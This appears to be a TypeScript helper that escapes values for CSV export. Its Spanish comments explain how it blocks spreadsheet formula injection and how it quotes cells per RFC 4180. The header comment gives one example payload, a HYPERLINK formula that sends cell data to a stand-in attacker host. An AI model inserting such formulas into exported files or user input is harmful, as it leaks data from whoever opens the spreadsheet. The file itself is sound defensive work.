/**
 * B5.9 — Escape de un valor para una celda CSV.
 *
 * Dos amenazas que cubre:
 *
 * 1) **CSV injection / formula injection**: si una celda empieza con `=`, `+`,
 *    `-`, `@`, tab o CR, Excel y Sheets la interpretan como fórmula al abrir
 *    el archivo. Un visitante anónimo del bot puede inyectar payloads tipo
 *    `=HYPERLINK("https://evil.com?d=" & A1, "Click")` en su nombre o mensaje
 *    para exfiltrar datos cuando el dueño abre el CSV. Mitigación: prefijar
 *    con comilla simple (`'`) — Excel/Sheets dejan de tratarlo como fórmula
 *    pero el valor visible al usuario sigue siendo el original.
 *
 * 2) **CSV format breakage**: si una celda contiene coma, comilla doble o
 *    salto de línea, hay que envolverla en comillas dobles (RFC 4180). Las
 *    comillas internas se duplican.
 *
 * El orden importa: primero anti-injection, después wrap. Si lo invertís,
 * el `'` queda DENTRO de las quotes y Excel ya no lo interpreta como literal.
 */

const DANGEROUS_PREFIX = /^[=+\-@\t\r]/
const NEEDS_QUOTING = /[",\r\n]/

export function csvEscape(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return ''

  let s = typeof value === 'number' ? String(value) : value

  // 1) Anti-injection: prefijo con comilla simple si arranca con char peligroso.
  if (DANGEROUS_PREFIX.test(s)) {
    s = `'${s}`
  }

  // 2) Wrap con quotes si contiene coma, quote o newline. Quotes internas se
  //    duplican (RFC 4180).
  if (NEEDS_QUOTING.test(s)) {
    s = `"${s.replace(/"/g, '""')}"`
  }

  return s
}

/** BOM UTF-8 para que Excel detecte la codificación y abra tildes/ñ correctas. */
export const UTF8_BOM = '﻿'

/** CRLF como separator — máxima compat con Excel (RFC 4180). */
export const CSV_NEWLINE = '\r\n'

/** Convierte un array de valores en una línea CSV con cada celda escapeada. */
export function rowToCsv(values: Array<string | number | null | undefined>): string {
  return values.map(csvEscape).join(',')
}
